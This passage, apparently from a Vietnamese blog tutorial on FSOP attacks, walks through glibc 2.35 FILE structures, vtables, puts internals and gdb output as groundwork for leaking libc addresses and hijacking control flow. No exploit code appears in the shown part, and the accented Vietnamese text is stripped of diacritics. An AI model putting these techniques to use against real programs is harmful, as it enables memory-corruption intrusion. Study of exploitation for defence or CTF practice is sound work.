</span></span><span style="display:flex;"><span>    _IO_read_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd56a3</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">+</span><span style="color:#ae81ff">131</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_read_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd56a3</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">+</span><span style="color:#ae81ff">131</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_read_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd56a3</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">+</span><span style="color:#ae81ff">131</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_write_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd56a3</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">+</span><span style="color:#ae81ff">131</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_write_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd56a3</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">+</span><span style="color:#ae81ff">131</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_write_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd56a3</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">+</span><span style="color:#ae81ff">131</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_buf_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd56a3</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">+</span><span style="color:#ae81ff">131</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_buf_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd56a4</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">+</span><span style="color:#ae81ff">132</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_save_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _IO_backup_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _IO_save_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _markers <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _chain <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd48e0</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdin_<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>    _fileno <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    _flags2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>    _old_offset <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    _cur_column <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>    _vtable_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#e6db74">&#39;\000&#39;</span>,
</span></span><span style="display:flex;"><span>    _shortbuf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _lock <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd6780</span> <span style="color:#f92672">&lt;</span>_IO_stdfile_1_lock<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>    _offset <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    _codecvt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _wide_data <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd47a0</span> <span style="color:#f92672">&lt;</span>_IO_wide_data_1<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>    _freeres_list <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _freeres_buf <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    __pad5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>    _mode <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    _unused2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\000&#39;</span> <span style="color:#f92672">&lt;</span>repeats <span style="color:#ae81ff">19</span> times<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>  vtable <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd36e0</span> <span style="color:#f92672">&lt;</span>__GI__IO_file_jumps<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>vtable</code> c kiu d liu l <code>_IO_jump_t</code>
<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L293">_IO_jump_t</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _IO_jump_t
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(<span style="color:#66d9ef">size_t</span>, __dummy);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(<span style="color:#66d9ef">size_t</span>, __dummy2);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_finish_t, __finish);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_overflow_t, __overflow);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_underflow_t, __underflow);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_underflow_t, __uflow);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_pbackfail_t, __pbackfail);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* showmany */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_xsputn_t, __xsputn);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_xsgetn_t, __xsgetn);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_seekoff_t, __seekoff);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_seekpos_t, __seekpos);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_setbuf_t, __setbuf);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_sync_t, __sync);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_doallocate_t, __doallocate);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_read_t, __read);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_write_t, __write);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_seek_t, __seek);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_close_t, __close);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_stat_t, __stat);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_showmanyc_t, __showmanyc);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_imbue_t, __imbue);
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>Struct ny cha cc con tr n cc phng thc IO cn thit trong lc x l file (fopen, fread, fwrite, fclose,&hellip;).</p>
<p>V d khi thc hin m 1 file thng qua fopen():
-&gt; Cc bc open file:</p>
<ul>
<li>Malloc FILE structure</li>
<li>Gn vtable vo FILE structure</li>
<li>Khi to FILE structure</li>
<li>Lin kt FILE structure vo _IO_list_all</li>
<li>Call fopen()</li>
</ul>
<p><em>Gn vtable vo FILE structure</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">_IO_JUMPS</span> (<span style="color:#f92672">&amp;</span>new_f<span style="color:#f92672">-&gt;</span>fp) <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>_IO_file_jumps;
</span></span></code></pre></div><p><code>_IO_file_jumps</code> l bng 1 trong nhiu<code>vtable</code>  tn ti trong chng trnh. Khi to <code>vtable</code> vi <code>_IO_file_jumps</code> khi m file.
Lm sao  gi hm  ?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">void</span> (<span style="color:#f92672">*</span>_IO_finish_t) (_IO_FILE <span style="color:#f92672">*</span>, <span style="color:#66d9ef">int</span>);
</span></span></code></pre></div><p>Khi thc hin <code>_IO_FINISH(FP)</code>, n s gi n hm c lu trong <code>vtable</code> ca <code>FILE</code> c truyn vo, vi ch mc kiu <code>int</code> l v tr ca hm <code>_IO_finish_t</code> trong bng <code>vtable</code>.</p>
<p>Hmm, mnh  khi qut xong.
Tm gn li, nu chng ta c th ghi  1 file structure no , th ta c th iu khin c ni m chng ta c th ghi, c -&gt; READ/WRITE PRIMITIVE . iu  kh l d dng nhng chng ta cn ch  cc iu kin.</p>
<p>Vy mnh t cu hi trong u: <code>Liu c th iu khin c lung thc thi sang hng khc nu nh mnh c th ghi  phn vng vtable khng ?</code></p>
<p>Mnh s ni r hn phn  trong phn cui cng !</p>
<h1 id="3-read-primitive">3. Read Primitive</h1>
<p>Lm sao chng ta c th leak c a ch ca libc thng qua FSOP attack ?</p>
<p>Trc ht, tm hiu cch hot ng ca hm <code>puts</code> trong C (glibc-2.35).</p>
<p>Chng trnh n gin sau thc hin vic in chui ra thit b xut chun</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;FSOP ATTACK&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Mnh setup source code v compile vi <code>glibc-2.35</code> bng cu lnh sau</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> wget https:<span style="color:#75715e">//ftp.gnu.org/gnu/glibc/glibc-2.35.tar.gz
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">$</span> tar <span style="color:#f92672">-</span>xvf glibc<span style="color:#f92672">-</span><span style="color:#ae81ff">2.35</span>.tar.gz
</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span> run binary in gdb
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> dir glibc<span style="color:#f92672">-</span><span style="color:#ae81ff">2.35</span><span style="color:#f92672">/</span>libio<span style="color:#f92672">/</span>
</span></span></code></pre></div><p>Sau khi load source code vo chng ta c th d dng debug hn vi code C.</p>
<p>Debug binary bng gdb:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disassemble main
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function main:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000001149</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;:</span>     endbr64
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000000114d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;:</span>     push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000000114e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">&gt;:</span>     mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000001151</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;:</span>     lea    rax,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xeac</span>]        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">0x2004</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000001158</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">&gt;:</span>    mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000000115b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">&gt;:</span>    call   <span style="color:#ae81ff">0x1050</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000001160</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">23</span><span style="color:#f92672">&gt;:</span>    mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000001165</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;:</span>    pop    rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000001166</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">29</span><span style="color:#f92672">&gt;:</span>    ret
</span></span><span style="display:flex;"><span>End of assembler dump.
</span></span></code></pre></div><p>Mnh t breakpoints ti hm ch gi n hm <code>puts@plt</code>  xem n lm g.</p>
<p>R rng, n gi n hm <code>_IO_puts</code> trong th vin
<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/ioputs.c#L31">_IO_puts</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">_IO_puts</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>str)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> result <span style="color:#f92672">=</span> EOF;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> len <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span> (str);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">_IO_acquire_lock</span> (stdout);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((<span style="color:#a6e22e">_IO_vtable_offset</span> (stdout) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>       <span style="color:#f92672">||</span> <span style="color:#a6e22e">_IO_fwide</span> (stdout, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">_IO_sputn</span> (stdout, str, len) <span style="color:#f92672">==</span> len
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">_IO_putc_unlocked</span> (<span style="color:#e6db74">&#39;\n&#39;</span>, stdout) <span style="color:#f92672">!=</span> EOF)
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#a6e22e">MIN</span> (INT_MAX, len <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">_IO_release_lock</span> (stdout);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">weak_alias</span> (_IO_puts, puts)
</span></span></code></pre></div><p>Ta thy trong source v assembly, tip tc gi n <code>_IO_sputn</code>.
Sau 1 hi tm kim th mnh bit l <code>_IO_sputn</code> l alias ti <code>_IO_XSPUTN (__fp, __s, __n)</code> qua dng code</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
</span></span></span></code></pre></div><p>n gin l n jump thng ti con tr hm trong <code>__xsputn</code> vi vtable l ca <code>stdout</code> FP.</p>
<pre tabindex="0"><code>#define _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)
</code></pre><p>Kim tra vtable ca <code>stdout</code> trong gdb, ta thy <code>__xsputn</code> tr n <code>_IO_new_file_xsputn</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> print _IO_file_jumps
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>  __dummy <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>  __dummy2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>  __finish <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c86060</span> <span style="color:#f92672">&lt;</span>_IO_new_file_finish<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __overflow <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c86e60</span> <span style="color:#f92672">&lt;</span>_IO_new_file_overflow<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __underflow <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c86af0</span> <span style="color:#f92672">&lt;</span>_IO_new_file_underflow<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __uflow <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c88100</span> <span style="color:#f92672">&lt;</span>__GI__IO_default_uflow<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __pbackfail <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c898c0</span> <span style="color:#f92672">&lt;</span>__GI__IO_default_pbackfail<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __xsputn <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c856b0</span> <span style="color:#f92672">&lt;</span>_IO_new_file_xsputn<span style="color:#f92672">&gt;</span>             <span style="color:#960050;background-color:#1e0010">#</span> target
</span></span><span style="display:flex;"><span>  __xsgetn <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c85340</span> <span style="color:#f92672">&lt;</span>__GI__IO_file_xsgetn<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __seekoff <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c849a0</span> <span style="color:#f92672">&lt;</span>_IO_new_file_seekoff<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __seekpos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c88840</span> <span style="color:#f92672">&lt;</span>_IO_default_seekpos<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __setbuf <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c84650</span> <span style="color:#f92672">&lt;</span>_IO_new_file_setbuf<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __sync <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c844e0</span> <span style="color:#f92672">&lt;</span>_IO_new_file_sync<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __doallocate <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c78060</span> <span style="color:#f92672">&lt;</span>__GI__IO_file_doallocate<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __read <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c859d0</span> <span style="color:#f92672">&lt;</span>__GI__IO_file_read<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __write <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c84f80</span> <span style="color:#f92672">&lt;</span>_IO_new_file_write<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __seek <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c84720</span> <span style="color:#f92672">&lt;</span>__GI__IO_file_seek<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __close <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c84640</span> <span style="color:#f92672">&lt;</span>__GI__IO_file_close<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __stat <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c84f70</span> <span style="color:#f92672">&lt;</span>__GI__IO_file_stat<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __showmanyc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c89a40</span> <span style="color:#f92672">&lt;</span>_IO_default_showmanyc<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __imbue <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c89a50</span> <span style="color:#f92672">&lt;</span>_IO_default_imbue<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Vy ta cng xem source hm <code>_IO_new_file_xsputn</code>
<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/fileops.c#L1196">_IO_new_file_xsputn</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">size_t</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">_IO_new_file_xsputn</span> (FILE <span style="color:#f92672">*</span>f, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>data, <span style="color:#66d9ef">size_t</span> n)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) data;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> to_do <span style="color:#f92672">=</span> n;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> must_flush <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (n <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* This is an optimized implementation.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     If the amount to be written straddles a block boundary
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     (or the filebuf is unbuffered), use sys_write directly. */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* First figure out how much space is available in the buffer. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_LINE_BUF) <span style="color:#f92672">&amp;&amp;</span> (f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_CURRENTLY_PUTTING))
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      count <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_buf_end <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_write_ptr;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (count <span style="color:#f92672">&gt;=</span> n)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p;
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">for</span> (p <span style="color:#f92672">=</span> s <span style="color:#f92672">+</span> n; p <span style="color:#f92672">&gt;</span> s; )
</span></span><span style="display:flex;"><span>	    {
</span></span><span style="display:flex;"><span>	      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*--</span>p <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>		  count <span style="color:#f92672">=</span> p <span style="color:#f92672">-</span> s <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>		  must_flush <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>		  <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	    }
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (f<span style="color:#f92672">-&gt;</span>_IO_write_end <span style="color:#f92672">&gt;</span> f<span style="color:#f92672">-&gt;</span>_IO_write_ptr)
</span></span><span style="display:flex;"><span>    count <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_write_end <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_write_ptr; <span style="color:#75715e">/* Space available. */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Then fill the buffer. */</span>
